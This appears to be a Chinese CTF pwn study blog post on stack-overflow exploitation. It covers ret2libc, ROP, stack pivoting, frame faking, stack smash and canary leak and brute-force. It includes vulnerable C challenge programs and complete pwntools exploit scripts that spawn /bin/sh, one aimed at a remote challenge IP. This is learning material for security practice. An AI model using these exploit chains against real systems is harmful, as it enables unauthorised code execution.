<p>2的基础上去掉了system的地址。</p>
<p>got 表泄露libc的函数地址</p>
<p>利用思路：</p>
<ul>
<li>泄露 __libc_start_main 地址</li>
<li>获取 libc 版本</li>
<li>获取 system 地址与 /bin/sh 的地址</li>
<li>再次执行源程序</li>
<li>触发栈溢出执行 system(‘/bin/sh’)</li>
</ul>
<p>exp:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
<span style="color:#f92672">from</span> LibcSearcher <span style="color:#f92672">import</span> LibcSearcher

context(log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;debug&#39;</span>,arch <span style="color:#f92672">=</span><span style="color:#e6db74">&#39;i386&#39;</span>,os <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;linux&#39;</span> )
<span style="color:#75715e"># io = process(&#39;./ret2libc3&#39;)</span>
io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;47.106.212.155&#34;</span>,<span style="color:#ae81ff">10008</span>)
elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./ret2libc3&#39;</span>)
puts_plt <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;puts&#39;</span>]
start_main_got <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;__libc_start_main&#39;</span>]
main <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;main&#39;</span>]

payload <span style="color:#f92672">=</span> flat([<span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">112</span>,puts_plt,main,start_main_got])
io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Can you find it !?&#34;</span>,payload)

libc_start_main_addr <span style="color:#f92672">=</span> u32(io<span style="color:#f92672">.</span>recv()[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">4</span>])
libc <span style="color:#f92672">=</span> LibcSearcher(<span style="color:#e6db74">&#39;__libc_start_main&#39;</span>,libc_start_main_addr)
libcbase <span style="color:#f92672">=</span> libc_start_main_addr<span style="color:#f92672">-</span>libc<span style="color:#f92672">.</span>dump(<span style="color:#e6db74">&#34;__libc_start_main&#34;</span>)
sym_addr <span style="color:#f92672">=</span> libcbase<span style="color:#f92672">+</span>libc<span style="color:#f92672">.</span>dump(<span style="color:#e6db74">&#39;system&#39;</span>)
binsh_addr <span style="color:#f92672">=</span> libcbase<span style="color:#f92672">+</span>libc<span style="color:#f92672">.</span>dump(<span style="color:#e6db74">&#39;str_bin_sh&#39;</span>)

payload <span style="color:#f92672">=</span> flat([<span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">112</span>,sym_addr,<span style="color:#e6db74">&#34;bbbb&#34;</span>,binsh_addr])
io<span style="color:#f92672">.</span>sendline(payload)
io<span style="color:#f92672">.</span>interactive()
</code></pre></div><h5 id="中级rop">中级ROP</h5>
<h6 id="ret2csu">ret2csu</h6>
<p>利用 x64 下的 __libc_csu_init 中的 gadgets.</p>
<p>eg:level5:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#undef _FORTIFY_SOURCE
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vulnerable_function</span>() {
	<span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">128</span>];
	read(STDIN_FILENO, buf, <span style="color:#ae81ff">512</span>);
}

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">**</span> argv) {
	write(STDOUT_FILENO, <span style="color:#e6db74">&#34;Hello, World</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">13</span>);
	vulnerable_function();
}
</code></pre></div><p>exp:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">
</code></pre></div><h6 id="ret2reg">ret2reg</h6>
<ul>
<li>略 无题目</li>
</ul>
<h6 id="brop">BROP</h6>
<ul>
<li>略 无二进制</li>
</ul>
<h5 id="高级rop">高级ROP</h5>
<h6 id="ret2_dl_runtime_resolve">ret2_dl_runtime_resolve</h6>
<p>XDCTF2015-pwn200</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>()
{
    <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">100</span>];
    setbuf(stdin, buf);
    read(<span style="color:#ae81ff">0</span>, buf, <span style="color:#ae81ff">256</span>);
}
<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
{
    <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">100</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Welcome to XDCTF2015~!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;

    setbuf(stdout, buf);
    write(<span style="color:#ae81ff">1</span>, buf, strlen(buf));
    vuln();
    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
<span style="color:#75715e">//gcc -o bof -m32 -fno-stack-protector bof.c
</span></code></pre></div><h6 id="srop">SROP</h6>
<h6 id="ret2vdso">ret2VDSO</h6>
<h5 id="花式栈溢出">花式栈溢出</h5>
<ul>
<li>stack pivoting</li>
</ul>
<p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF%20Quals%202016%20-%20b0verfl0w">X-CTF Quals 2016 - b0verfl0w</a></p>
<p>转移堆：<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/EkoPartyCTF%202016%20fuckzing-exploit-200">EkoPartyCTF 2016 fuckzing-exploit-200</a></p>
<ul>
<li>frame faking</li>
</ul>
<p>2018 安恒杯 over</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190522130814.png" alt=""></p>
<p>直接EXP 分析，，困扰了很久的exp</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./over.over&#34;</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">DEBUG</span>(cmd):
    raw_input(<span style="color:#e6db74">&#34;DEBUG: &#34;</span>)
    gdb<span style="color:#f92672">.</span>attach(io, cmd)

io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./over.over&#34;</span>)
elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./over.over&#34;</span>)
libc <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>libc

io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#34;&gt;&#34;</span>, <span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">80</span>)
stack <span style="color:#f92672">=</span> u64(io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x7f</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>: ]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x70</span>
success(<span style="color:#e6db74">&#34;stack -&gt; {:#x}&#34;</span><span style="color:#f92672">.</span>format(stack))


<span style="color:#75715e">#  DEBUG(&#34;b *0x4006B9\nc&#34;) 96</span>
io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#34;&gt;&#34;</span>, flat([<span style="color:#e6db74">&#39;11111111&#39;</span>, <span style="color:#ae81ff">0x400793</span>, elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;puts&#39;</span>], elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;puts&#39;</span>], <span style="color:#ae81ff">0x400676</span>, (<span style="color:#ae81ff">80</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">40</span>) <span style="color:#f92672">*</span> <span style="color:#e6db74">&#39;1&#39;</span>, stack, <span style="color:#ae81ff">0x4006be</span>]))
libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u64(io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x7f</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>: ]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;puts&#39;</span>]
success(<span style="color:#e6db74">&#34;libc.address -&gt; {:#x}&#34;</span><span style="color:#f92672">.</span>format(libc<span style="color:#f92672">.</span>address))

pop_rdi_ret<span style="color:#f92672">=</span><span style="color:#ae81ff">0x400793</span>
<span style="color:#e6db74">&#39;&#39;&#39;
</span><span style="color:#e6db74">$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only &#34;pop|ret&#34;
</span><span style="color:#e6db74">0x00000000000f5279 : pop rdx ; pop rsi ; ret
</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
pop_rdx_pop_rsi_ret<span style="color:#f92672">=</span>libc<span style="color:#f92672">.</span>address<span style="color:#f92672">+</span><span style="color:#ae81ff">0xf5279</span>


payload<span style="color:#f92672">=</span>flat([<span style="color:#e6db74">&#39;22222222&#39;</span>, pop_rdi_ret, next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>)),pop_rdx_pop_rsi_ret,p64(<span style="color:#ae81ff">0</span>),p64(<span style="color:#ae81ff">0</span>), libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;execve&#39;</span>], (<span style="color:#ae81ff">80</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">7</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> ) <span style="color:#f92672">*</span> <span style="color:#e6db74">&#39;2&#39;</span>, stack <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x4006be</span>])

io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#34;&gt;&#34;</span>, payload)

io<span style="color:#f92672">.</span>interactive()

</code></pre></div><ul>
<li>Stack smash</li>
</ul>
<p>35c3 CTF readme</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190522132544.png" alt=""></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

addr_ow_flag <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x600d20</span>
addr_flag <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400d20</span>

H,P <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;localhost&#39;</span>, <span style="color:#ae81ff">6666</span>

<span style="color:#75715e">#r = process(&#39;./readme.bin&#39;)</span>
r <span style="color:#f92672">=</span> remote(H,P)
junk  <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;What&#39;s your name? &#34;</span>)
exploit  <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x218</span>
exploit <span style="color:#f92672">+=</span> p64(addr_flag)
exploit <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
exploit <span style="color:#f92672">+=</span> p64(addr_ow_flag)
r<span style="color:#f92672">.</span>sendline(exploit)
junk <span style="color:#f92672">+=</span> r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Please overwrite the flag: &#34;</span>)
exploit  <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;LIBC_FATAL_STDERR_=1&#34;</span>
r<span style="color:#f92672">.</span>sendline(exploit)
junk <span style="color:#f92672">+=</span> r<span style="color:#f92672">.</span>recvall()
<span style="color:#66d9ef">print</span> junk

</code></pre></div><ul>
<li>栈上partial overwrite</li>
</ul>
<p>2018 安恒杯 babypie</p>
<p>2018 XNUCA-gets</p>
<h5 id="canary-绕过技术">Canary 绕过技术</h5>
<ul>
<li>
<p>泄露栈中的Canary</p>
<p>覆盖 Canary 的低字节，来打印出剩余的 Canary 部分</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">// ex2.c
</span><span style="color:#75715e"></span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">getshell</span>(<span style="color:#66d9ef">void</span>) {
    system(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>);
}
<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">init</span>() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
}
<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>() {
    <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">100</span>];
    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">2</span>;i<span style="color:#f92672">++</span>){
        read(<span style="color:#ae81ff">0</span>, buf, <span style="color:#ae81ff">0x200</span>);
        printf(buf);
    }
}
<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>) {
    init();
    puts(<span style="color:#e6db74">&#34;Hello Hacker!&#34;</span>);
    vuln();
    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p>EXP</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>
   
<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
   
context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;ex2&#39;</span><span style="color:#75715e">#全局系统自动设置，为官方推荐设置，ex2为文件名称。</span>
<span style="color:#75715e">#context.log_level = &#39;debug&#39;#debug模式下才开启</span>
io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./ex2&#39;</span>) <span style="color:#75715e">#本地连接到ex2</span>
   
get_shell <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./ex2&#34;</span>)<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;getshell&#34;</span>] <span style="color:#75715e">#由于源码里有getshell函数，所以直接可以使用ELF模块找到getshell函数地址。</span>
   
io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Hello Hacker!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)<span style="color:#75715e">#接受传来的第一部分字符</span>
   
<span style="color:#75715e"># leak Canary</span>
payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">100</span> 
io<span style="color:#f92672">.</span>sendline(payload) <span style="color:#75715e">#传输100个A</span>
   
io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">100</span>)
Canary <span style="color:#f92672">=</span> u32(io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4</span>))<span style="color:#f92672">-</span><span style="color:#ae81ff">0xa</span> <span style="color:#75715e">#因为cannary最后一位字节为00被0x0a覆盖，所以减去0x0a</span>
log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Canary:&#34;</span><span style="color:#f92672">+</span>hex(Canary))<span style="color:#75715e">#日志记录下canary</span>
   
<span style="color:#75715e"># Bypass Canary</span>
payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">100</span><span style="color:#f92672">+</span>p32(Canary)<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">12</span><span style="color:#f92672">+</span>p32(get_shell)<span style="color:#75715e">#发送最后的payload</span>
io<span style="color:#f92672">.</span>send(payload)
   
io<span style="color:#f92672">.</span>recv()
   
io<span style="color:#f92672">.</span>interactive()
</code></pre></div></li>
<li>
<p>one-by-one 爆破 Canary</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;[+] Brute forcing stack canary &#34;</span>
  
start <span style="color:#f92672">=</span> len(p)
stop <span style="color:#f92672">=</span> len(p)<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>
  
<span style="color:#66d9ef">while</span> len(p) <span style="color:#f92672">&lt;</span> stop:
   <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> xrange(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">256</span>):
      res <span style="color:#f92672">=</span> send2server(p <span style="color:#f92672">+</span> chr(i))
  
      <span style="color:#66d9ef">if</span> res <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;&#34;</span>:
         p <span style="color:#f92672">=</span> p <span style="color:#f92672">+</span> chr(i)
         <span style="color:#75715e">#print &#34;\t[+] Byte found 0x%02x&#34; % i</span>
         <span style="color:#66d9ef">break</span>
  
      <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">255</span>:
         <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;[-] Exploit failed&#34;</span>
         sys<span style="color:#f92672">.</span>exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
  
  
canary <span style="color:#f92672">=</span> p[stop:start<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;hex&#34;</span>)
<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;   [+] SSP value is 0x</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> 
</code></pre></div></li>
<li>
<p>canary劫持__stack_chk_fail 函数</p>
</li>
<li>
<p>覆盖 TLS 中储存的 Canary 值</p>
</li>
</ul>

            </div>
        </article>

        <hr />

        <div class="post-info">
                <p>
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://kuekiko.top/tags/pwn">PWN</a></span><span class="tag"><a href="https://kuekiko.top/tags/ctf">CTF</a></span>
                </p>

            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>1044 Words</p>

            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2019-02-20 00:17 &#43;0800</p>
        </div>

        
            <div class="pagination">
                <div class="pagination__title">
                    <span class="pagination__title-h"></span>
                    <hr />
                </div>

                <div class="pagination__buttons">
                    
                        <span class="button previous">
                            <a href="https://kuekiko.top/posts/2019/02/rop%E7%BB%83%E4%B9%A0/">
                                <span class="button__icon">←</span>
                                <span class="button__text">ROP练习</span>
                            </a>
                        </span>
                    

                    
                        <span class="button next">
                            <a href="https://kuekiko.top/posts/2019/02/frida%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83_2/">
                                <span class="button__text">Frida从入门到放弃_2</span>
                                <span class="button__icon">→</span>
                            </a>
                        </span>
                    
                </div>
            </div>
        
    </main>

            </div>

            
                <footer class="footer">
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2021</span>
            
                <span><a href="https://kuekiko.top">Kuekiko</a></span>
            
            
                <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
            
            <span> <a href="https://kuekiko.top/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
        </div>
    </div>
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
            <span>Made with &#10084; by <a href="https://github.com/rhazdon">Djordje Atlialp</a></span>
        </div>
    </div>
</footer>

            
        </div>

        




<script type="text/javascript" src="https://kuekiko.top/bundle.min.dc716e9092c9820b77f96da294d0120aeeb189b5bcea9752309ebea27fd53bbe6b13cffb2aca8ecf32525647ceb7001f76091de4199ac5a3caa432c070247f5b.js" integrity="sha512-3HFukJLJggt3&#43;W2ilNASCu6xibW86pdSMJ6&#43;on/VO75rE8/7KsqOzzJSVkfOtwAfdgkd5BmaxaPKpDLAcCR/Ww=="></script>



    </body>
</html>
